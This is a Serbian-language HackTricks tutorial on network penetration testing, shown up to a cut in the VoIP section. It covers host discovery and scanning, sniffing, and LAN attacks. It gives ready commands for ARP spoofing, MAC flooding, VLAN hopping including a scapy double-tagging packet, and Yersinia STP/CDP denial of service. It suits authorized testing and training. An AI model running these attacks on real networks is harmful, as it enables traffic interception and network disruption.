# Pentesting Network

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Savet za bug bounty**: **registrujte se** na **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Otkrivanje hostova sa spoljne strane

Ovo će biti **kratko poglavlje** o tome kako pronaći **IP adrese koje odgovaraju** sa **Interneta**.\
U ovoj situaciji imate neki **opseg IP adresa** (možda čak i nekoliko **opsega**) i samo želite da pronađete **koje IP adrese odgovaraju**.

### ICMP

Ovo je najlakši i najbrži način da otkrijete da li je host dostupan ili ne.\
Možete pokušati da pošaljete neke **ICMP** pakete i **očekujete odgovore**. Najlakši način je jednostavno slanje **echo zahteva** i očekivanje odgovora. To možete uraditi koristeći jednostavnu `ping` komandu ili koristeći `fping` za **opsege**.\
Takođe možete koristiti **nmap** da biste poslali druge vrste ICMP paketa (ovo će izbeći filtere za uobičajene ICMP echo zahtev-odgovor).

```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```

### Otkrivanje TCP portova

Veoma je često da se ustanovi da su sve vrste ICMP paketa filtrirane. Tada, sve što možete da uradite da biste proverili da li je host dostupan je da **pokušate da pronađete otvorene portove**. Svaki host ima **65535 portova**, pa ako imate "veliki" opseg, **ne možete** testirati da li je **svaki port** svakog hosta otvoren ili ne, to bi oduzelo previše vremena.\
Zato vam je potreban **brzi skener portova** ([masscan](https://github.com/robertdavidgraham/masscan)) i lista **najčešće korišćenih portova:**

```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```

Možete izvršiti ovaj korak i sa `nmap`, ali je sporiji i `nmap` ima problema sa identifikacijom dostupnih hostova.

### Otkrivanje HTTP porta

Ovo je samo otkrivanje TCP porta koje je korisno kada želite da se fokusirate na otkrivanje HTTP servisa:

```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```

### Otkrivanje UDP porta

Takođe možete pokušati da proverite da li je neki **UDP port otvoren** kako biste odlučili da li treba da **posvetite više pažnje** određenom **hostu**. Pošto UDP servisi obično **ne odgovaraju** sa **bilo kakvim podacima** na običan prazan UDP probni paket, teško je reći da li je port filtriran ili otvoren. Najlakši način da se to utvrdi je slanje paketa koji je povezan sa pokrenutim servisom, a pošto ne znate koji servis je pokrenut, trebali biste probati najverovatniji na osnovu broja porta:

```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```

Linija nmap koja je predložena ranije će testirati **1000 najčešće korišćenih UDP portova** na svakom hostu unutar opsega **/24**, ali čak i to će trajati **>20 minuta**. Ako vam trebaju **najbrži rezultati**, možete koristiti [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Ovo će poslati ove **UDP probe** na njihove **očekivane portove** (za opseg /24 će trajati samo 1 minut): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Otkrivanje SCTP portova

```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```

## Pentestiranje Wifi-a

Ovde možete pronaći lep vodič za sve poznate napade na Wifi u vreme pisanja:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Otkrivanje hostova iznutra

Ako se nalazite unutar mreže, jedna od prvih stvari koje ćete želeti da uradite je da **otkrijete druge hostove**. Zavisno od **koliko buke** želite/hoćete da napravite, mogu se izvršiti različite radnje:

### Pasivno

Možete koristiti ove alate za pasivno otkrivanje hostova unutar povezane mreže:

```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```

### Aktivno

Imajte na umu da se tehnike opisane u [_**Otkrivanje hostova sa spoljne strane**_](./#otkrivanje-hostova-sa-spoljne-strane) (_Otkrivanje TCP/HTTP/UDP/SCTP portova_) takođe mogu **primeniti ovde**.\
Međutim, pošto se nalazite u **istoj mreži** kao i ostali hostovi, možete uraditi **više stvari**:

```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```

### Aktivni ICMP

Imajte na umu da se tehnike koje su komentarisane u odeljku _Otkrivanje hostova sa spoljne strane_ ([_**ICMP**_](./#icmp)) mogu **primeniti i ovde**.\
Ali, pošto se nalazite u **istoj mreži** kao i ostali hostovi, možete uraditi **više stvari**:

* Ako **pingujete** adresu **subnet broadcasta**, ping bi trebao da stigne do **svakog hosta** i oni bi mogli da **odgovore** vama: `ping -b 10.10.5.255`
* Pingovanjem **broadcast adrese mreže** čak možete pronaći hostove unutar **drugih subnetova**: `ping -b 255.255.255.255`
* Koristite opcije `-PE`, `-PP`, `-PM` naredbe `nmap` za otkrivanje hostova slanjem odgovarajućih zahteva za **ICMPv4 echo**, **timestamp** i **subnet masku**: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Budjenje preko mreže (Wake On Lan)**

Budjenje preko mreže (Wake On Lan) se koristi za **uključivanje** računara putem **mrežne poruke**. Čarobni paket koji se koristi za uključivanje računara je samo paket u kojem je navedena **MAC adresa odredišta** i zatim se **16 puta ponavlja** unutar istog paketa.\
Ovakvi paketi se obično šalju u **ethernet 0x0842** ili u **UDP paket na port 9**.\
Ako nije navedena **\[MAC]** adresa, paket se šalje na **broadcast ethernet** (i broadcast MAC adresa će biti ona koja se ponavlja).

```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```

## Skeniranje Hostova

Kada ste otkrili sve IP adrese (spoljne ili unutrašnje) koje želite detaljno skenirati, možete izvršiti različite akcije.

### TCP

* **Otvoren** port: _SYN --> SYN/ACK --> RST_
* **Zatvoren** port: _SYN --> RST/ACK_
* **Filtriran** port: _SYN --> \[BEZ ODGOVORA]_
* **Filtriran** port: _SYN --> ICMP poruka_

```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```

### UDP

Postoje 2 opcije za skeniranje UDP porta:

* Pošaljite **UDP paket** i proverite odgovor _**ICMP nedostupan**_ ako je port **zatvoren** (u nekim slučajevima ICMP će biti **filtriran** pa nećete dobiti nikakve informacije ako je port zatvoren ili otvoren).
* Pošaljite **formatirane datagrame** da biste izazvali odgovor od **servisa** (npr. DNS, DHCP, TFTP i drugi, kao što je navedeno u _nmap-payloads_). Ako dobijete **odgovor**, tada je port **otvoren**.

**Nmap** će **mešati obe** opcije koristeći "-sV" (UDP skeniranja su veoma spora), ali imajte na umu da su UDP skeniranja sporija od TCP skeniranja:

```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```

### SCTP Skeniranje

**SCTP (Stream Control Transmission Protocol)** je dizajniran da se koristi zajedno sa **TCP (Transmission Control Protocol)** i **UDP (User Datagram Protocol)**. Njegova glavna svrha je olakšavanje prenosa telefonskih podataka preko IP mreža, oponašajući mnoge od karakteristika pouzdanosti koje se nalaze u **Signaling System 7 (SS7)**. **SCTP** je osnovna komponenta porodičnog protokola **SIGTRAN**, koji ima za cilj prenos SS7 signala preko IP mreža.

Podrška za **SCTP** je obezbeđena od strane različitih operativnih sistema, kao što su **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** i **VxWorks**, što ukazuje na njegovo široko prihvatanje i korisnost u oblasti telekomunikacija i mrežnog povezivanja.

Nmap nudi dva različita skeniranja za SCTP: _-sY_ i _-sZ_

```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```

### Evidencija IDS i IPS-a

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Više opcija za nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Otkrivanje internih IP adresa

**Nekonfigurisani ruteri, firewall-i i mrežni uređaji** ponekad odgovaraju na mrežne upite koristeći **nejavne izvorne adrese**. **tcpdump** se može koristiti za identifikaciju paketa primljenih sa privatnih adresa tokom testiranja. Konkretno, na Kali Linux-u, paketi se mogu uhvatiti na **eth2 interfejsu**, koji je dostupan sa javnog interneta. Važno je napomenuti da će, ako je vaša konfiguracija iza NAT-a ili firewall-a, takvi paketi verovatno biti filtrirani.

```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```

## Snifovanje

Snifovanjem možete saznati detalje o IP opsezima, veličinama podmreža, MAC adresama i imenima hostova pregledanjem uhvaćenih frejmova i paketa. Ako je mreža loše konfigurisana ili ako je prekidač pod stresom, napadači mogu uhvatiti osetljive podatke putem pasivnog snifovanja mreže.

Ako je prekidač u Ethernet mreži pravilno konfigurisan, videćete samo emitovane frejmove i materijal namenjen vašoj MAC adresi.

### TCPDump

```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```

Takođe, moguće je snimati pakete sa udaljenog računara preko SSH sesije koristeći Wireshark kao grafički interfejs u realnom vremenu.

```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```

### Bettercap

Bettercap je moćan alat za mrežno pentestiranje koji pruža razne funkcionalnosti za analizu i manipulaciju mrežnog saobraćaja. Ovaj alat omogućava hakere da izvrše različite napade na mrežu, kao što su presretanje paketa, DNS spoofing, ARP spoofing i mnoge druge tehnike.

#### Instalacija

Da biste instalirali Bettercap, pratite sledeće korake:

1. Prvo, instalirajte Go programski jezik na svom sistemu.
2. Zatim, klonirajte Bettercap repozitorijum sa GitHub-a.
3. Uđite u direktorijum repozitorijuma i pokrenite `make build` komandu.
4. Nakon završetka kompilacije, pokrenite `make install` komandu da biste instalirali Bettercap.

#### Upotreba

Bettercap se može koristiti za različite svrhe, uključujući:

* Presretanje mrežnog saobraćaja: Bettercap može presretati mrežni saobraćaj između uređaja i rutera, omogućavajući hakerima da prate i analiziraju komunikaciju.
* DNS spoofing: Ovaj alat omogućava hakere da izvrše DNS spoofing napade, preusmeravajući DNS upite na lažne IP adrese.
* ARP spoofing: Bettercap može izvršiti ARP spoofing napade, lažirajući ARP odgovore i preusmeravajući mrežni saobraćaj na hakerov uređaj.
* SSL/TLS interseptacija: Alat podržava interseptaciju SSL/TLS saobraćaja, omogućavajući hakerima da dešifruju enkriptovane podatke.

#### Zaključak

Bettercap je moćan alat za mrežno pentestiranje koji pruža razne funkcionalnosti za analizu i manipulaciju mrežnog saobraćaja. Korišćenje ovog alata zahteva odgovornost i etičko postupanje, jer može biti zloupotrebljen za neovlašćene aktivnosti.

```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```

### Wireshark

Očigledno.

### Snimanje akreditacija

Možete koristiti alate poput [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) za parsiranje akreditacija iz pcap datoteke ili sa živog interfejsa.

## Napadi na LAN mrežu

### ARP spoofing

ARP spoofing se sastoji od slanja lažnih ARP odgovora kako bi se naznačilo da IP adresa određenog uređaja ima MAC adresu našeg uređaja. Zatim, žrtva će promeniti ARP tabelu i kontaktiraće naš uređaj svaki put kada želi da kontaktira IP adresu koja je lažirana.

#### **Bettercap**

```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```

#### **Arpspoof**

Arpspoof je alat koji omogućava napadaču da lažira ARP odgovore i preusmerava mrežni saobraćaj. Ovo omogućava napadaču da izvede napade kao što su Man-in-the-Middle (MitM) i sniffing mrežnog saobraćaja. Arpspoof koristi ARP protokol za manipulaciju ARP tabela na ciljnom računaru i usmerava saobraćaj preko napadačevog računara. Ovo omogućava napadaču da presretne, modifikuje ili prisluškuje mrežni saobraćaj između dve komunikacijske strane.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```

### MAC Poplavljanje - Prekoračenje CAM tabele

Prekoračite CAM tabelu prekidača slanjem velikog broja paketa sa različitim izvornim MAC adresama. Kada je CAM tabela puna, prekidač počinje da se ponaša kao hub (emituje sav saobraćaj).

```bash
macof -i <interface>
```

U modernim prekidačima ova ranjivost je ispravljena.

### Napadi na 802.1Q VLAN / DTP

#### Dinamičko trunkiranje

**Protokol dinamičkog trunkiranja (DTP)** je dizajniran kao protokol sloja veze kako bi olakšao automatski sistem za trunkiranje, omogućavajući prekidačima da automatski odaberu portove za trunk režim (Trunk) ili ne-trunk režim. Implementacija **DTP**-a često se smatra indikativnom za suboptimalni dizajn mreže, naglašavajući važnost ručnog konfigurisanja trunkova samo tamo gde je to potrebno i obezbeđivanja odgovarajuće dokumentacije.

Prema zadanim podešavanjima, portovi prekidača su podešeni da rade u režimu Dinamički Auto, što znači da su spremni da pokrenu trunkiranje ako ih podstakne susedni prekidač. Bezbednosna zabrinutost se javlja kada pentester ili napadač poveže se na prekidač i pošalje DTP Desirable okvir, prisiljavajući port da uđe u trunk režim. Ova akcija omogućava napadaču da nabroji VLAN-ove kroz analizu STP okvira i zaobiđe segmentaciju VLAN-ova postavljanjem virtuelnih interfejsa.

Prisustvo DTP-a u mnogim prekidačima po zadanim podešavanjima može biti iskorišćeno od strane protivnika kako bi imitirali ponašanje prekidača, čime dobijaju pristup saobraćaju preko svih VLAN-ova. Skripta [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) se koristi za praćenje interfejsa, otkrivajući da li je prekidač u režimu Podrazumevano, Trunk, Dinamički, Auto ili Pristup - poslednja konfiguracija je jedina imuna na napade VLAN hopping-a. Ovaj alat procenjuje ranjivost prekidača.

Ukoliko se identifikuje ranjivost mreže, može se koristiti alat _**Yersinia**_ za "omogućavanje trunkiranja" putem DTP protokola, što omogućava posmatranje paketa sa svih VLAN-ova.

```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```

![](<../../.gitbook/assets/image (646) (1).png>)

Da biste nabrojali VLAN-ove, takođe je moguće generisati DTP Desirable okvir pomoću skripte [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**e prekidajte skriptu ni pod kojim okolnostima. Ona ubacuje DTP Desirable svake tri sekunde. **Dinamički kreirani trunk kanali na prekidaču žive samo pet minuta. Nakon pet minuta, trunk se prekida.**

```
sudo python3 DTPHijacking.py --interface eth0
```

Želim da naglasim da **Pristup/Poželjan (0x03)** ukazuje da je DTP okvir tipa Poželjan, što govori portu da pređe u Trunk režim. A **802.1Q/802.1Q (0xa5**) ukazuje na tip inkapsulacije **802.1Q**.

Analizom STP okvira, **saznajemo o postojanju VLAN-a 30 i VLAN-a 60.**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Napad na određene VLAN-ove

Kada saznate VLAN ID-ove i vrednosti IP adresa, možete **konfigurisati virtuelno sučelje za napad na određeni VLAN**.\
Ako DHCP nije dostupan, koristite _ifconfig_ za podešavanje statičke IP adrese.

```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```

#### Automatski VLAN Hopper

Opisani napad na **Dinamičko Trunkovanje i kreiranje virtuelnih interfejsa i otkrivanje hostova unutar** drugih VLAN-ova se **automatski izvodi** pomoću alata: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Dvostruko označavanje

Ako napadač zna vrednost **MAC, IP i VLAN ID žrtvinog hosta**, može pokušati da **dvostruko označi okvir** sa svojom određenom VLAN-om i VLAN-om žrtve i pošalje paket. Pošto **žrtva neće moći da se poveže nazad** sa napadačem, najbolja opcija za napadača je komunikacija putem UDP-a sa protokolima koji mogu izvršiti neke zanimljive akcije (kao što je SNMP).

Druga opcija za napadača je da pokrene **TCP port skeniranje sa lažiranim IP-jem kontrolisanim od strane napadača i dostupnim žrtvi** (verovatno preko interneta). Zatim, napadač može prisluškivati na drugom hostu koji je u njegovom vlasništvu da li prima pakete od žrtve.

![](<../../.gitbook/assets/image (635) (1).png>)

Za izvođenje ovog napada možete koristiti scapy: `pip install scapy`

```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```

#### Bypassiranje segmentacije VLAN-a na bočnoj strani <a href="#d679" id="d679"></a>

Ako imate **pristup prekidaču s kojim ste direktno povezani**, imate mogućnost **bypassiranja segmentacije VLAN-a** unutar mreže. Jednostavno **prebacite port u režim trunka** (poznat i kao trunk), kreirajte virtuelne interfejse sa ID-ovima ciljnih VLAN-ova i konfigurišite IP adresu. Možete pokušati da zatražite adresu dinamički (DHCP) ili je možete konfigurisati statički. To zavisi od slučaja.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Bypassiranje privatne VLAN segmentacije na sloju 3

U određenim okruženjima, kao što su gostujuće bežične mreže, postavke **izolacije porta (poznate i kao privatne VLAN)** se primenjuju kako bi se sprečilo direktno komuniciranje klijenata koji su povezani sa bežičnom tačkom pristupa. Međutim, identifikovana je tehnika koja može zaobići ove mere izolacije. Ova tehnika iskorišćava nedostatak ACL-ova u mreži ili njihovu nepravilnu konfiguraciju, omogućavajući IP paketima da budu rutirani preko rutera kako bi stigli do drugog klijenta u istoj mreži.

Napad se izvodi tako što se kreira **paketa koji nosi IP adresu odredišnog klijenta, ali sa MAC adresom rutera**. To dovodi do toga da ruter greškom prosleđuje paket ciljnom klijentu. Ovaj pristup je sličan onome koji se koristi u napadima sa dvostrukim označavanjem, gde se koristi mogućnost kontrole hosta koji je dostupan žrtvi kako bi se iskoristila bezbednosna slabost.

**Ključni koraci napada:**

1. **Kreiranje paketa:** Paket se posebno kreira tako da sadrži IP adresu ciljnog klijenta, ali sa MAC adresom rutera.
2. **Iskorišćavanje ponašanja rutera:** Kreirani paket se šalje do rutera koji, zbog konfiguracije, preusmerava paket ciljnom klijentu, zaobilazeći izolaciju koju pružaju postavke privatne VLAN segmentacije.

### Napadi na VTP

VTP (VLAN Trunking Protocol) centralizuje upravljanje VLAN-ovima. Koristi revizijske brojeve za održavanje integriteta baze podataka VLAN-ova; svaka izmena povećava ovaj broj. Prekidači usvajaju konfiguracije sa većim revizijskim brojevima, ažurirajući svoje vlastite baze podataka VLAN-ova.

#### Uloge VTP domena

* **VTP server:** Upravlja VLAN-ovima - kreira, briše, menja. Emituje VTP obaveštenja članovima domena.
* **VTP klijent:** Prima VTP obaveštenja radi sinhronizacije svoje baze podataka VLAN-ova. Ova uloga je ograničena od lokalnih izmena konfiguracije VLAN-a.
* **VTP Transparent:** Ne učestvuje u VTP ažuriranjima, ali prosleđuje VTP obaveštenja. Nezavisan od VTP napada, održava konstantan revizijski broj nula.

#### Tipovi VTP obaveštenja

* **Sažeto obaveštenje:** Emituje ga VTP server svakih 300 sekundi, noseći osnovne informacije o domenu.
* **Podskup obaveštenja:** Slanje nakon promena u konfiguraciji VLAN-a.
* **Zahtev za obaveštenje:** Izdaje ga VTP klijent kako bi zatražio sažeto obaveštenje, obično kao odgovor na otkrivanje većeg revizijskog broja konfiguracije.

Ranjivosti VTP-a se mogu iskoristiti isključivo putem trunk portova, jer se VTP obaveštenja kruže samo kroz njih. Scenariji napada nakon DTP-a mogu se usmeriti ka VTP-u. Alati poput Yersinie mogu olakšati VTP napade, sa ciljem brisanja baze podataka VLAN-ova i efektivnog ometanja mreže.

Napomena: Ova diskusija se odnosi na VTP verziju 1 (VTPv1).

````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````

U grafičkom režimu Yersinie, izaberite opciju brisanja svih VTP VLAN-ova kako biste očistili VLAN bazu podataka.

### Napadi na STP

**Ako ne možete snimati BPDU okvire na svojim interfejsima, malo je verovatno da ćete uspeti u napadu na STP.**

#### **STP BPDU DoS**

Slanjem velikog broja BPDU TCP (Topology Change Notification) ili Conf (BPDU koji se šalju prilikom kreiranja topologije), preopterećuju se prekidači i prestaju pravilno raditi.

```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```

#### **STP TCP Napad**

Kada se TCP paket pošalje, CAM tabela prekidača će biti obrisana za 15 sekundi. Zatim, ako neprekidno šaljete ovu vrstu paketa, CAM tabela će se neprekidno restartovati (svakih 15 sekundi) i kada se restartuje, prekidač se ponaša kao hub.

```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```

#### **STP Root Napad**

Napadač simulira ponašanje prekidača kako bi postao STP koren mreže. Zatim će više podataka prolaziti kroz njega. Ovo je interesantno kada ste povezani sa dva različita prekidača.\
Ovo se postiže slanjem BPDUs CONF paketa koji govore da je vrednost **prioriteta** manja od stvarnog prioriteta trenutnog korenskog prekidača.

```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```

**Ako napadač bude povezan sa 2 prekidača, može postati koren nove mreže i sav saobraćaj između tih prekidača će prolaziti kroz njega** (izvršiće se napad MITM).

```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```

### Napadi na CDP

CISCO Discovery Protocol (CDP) je ključan za komunikaciju između CISCO uređaja, omogućavajući im da **identifikuju jedni druge i dele konfiguracione detalje**.

#### Pasivno prikupljanje podataka <a href="#id-0e0f" id="id-0e0f"></a>

CDP je konfigurisan da emituje informacije kroz sve portove, što može predstavljati sigurnosni rizik. Napadač, nakon povezivanja na switch port, može koristiti mrežne snifere poput **Wireshark**, **tcpdump** ili **Yersinia**. Ova akcija može otkriti osetljive podatke o mrežnom uređaju, uključujući njegov model i verziju Cisco IOS-a koju koristi. Napadač može zatim ciljati specifične ranjivosti u identifikovanoj verziji Cisco IOS-a.

#### Izazivanje preplavljivanja CDP tabele <a href="#id-0d6a" id="id-0d6a"></a>

Agresivniji pristup uključuje pokretanje napada Denial of Service (DoS) preplavljujući memoriju switch-a, pretvarajući se da je legitimni CISCO uređaj. U nastavku je prikazana sekvencija komandi za pokretanje takvog napada koristeći Yersinia, mrežni alat dizajniran za testiranje:

```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```

Tokom ovog napada, CPU prekidača i tabela suseda CDP-a su jako opterećeni, što često dovodi do onoga što se naziva **"paraliza mreže"** zbog prekomerne potrošnje resursa.

#### Napad impersonacije CDP-a

```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```

Takođe možete koristiti [**scapy**](https://github.com/secdev/scapy/). Budite sigurni da ga instalirate sa `scapy/contrib` paketom.

### Napadi na VoIP i alat VoIP Hopper

VoIP telefoni, koji su sve više integrisani sa IoT uređajima, nude funkcionalnosti poput otključavanja vrata ili kontrole termostata putem posebnih telefonskih brojeva. Međutim, ova integracija može predstavljati sigurnosne rizike.

Alat [**voiphopper**](http://voiphopper.sourceforge.net) je dizajniran da emulira VoIP telefon u različitim okruženjima (Cisco, Avaya, Nortel, Alcatel-Lucent). Otkriva VLAN ID glasovne mreže koristeći protokole poput CDP, DHCP, LLDP-MED i 802.1Q ARP.

**VoIP Hopper** nudi tri moda za Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analizira mrežne pakete kako bi identifikovao VLAN ID.
2. **Spoof Mode** (`-c 1`): Generiše prilagođene pakete koji oponašaju stvarne VoIP uređaje.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Šalje pakete identične onima određenog modela Cisco IP telefona.

Preferirani mod za brzinu je treći. Zahteva navođenje:

* Mrežni interfejs napadača (parametar `-i`).
* Naziv emuliranog VoIP uređaja (parametar `-E`), u skladu sa Cisco formatom imenovanja (npr. SEP praćeno MAC adresom).

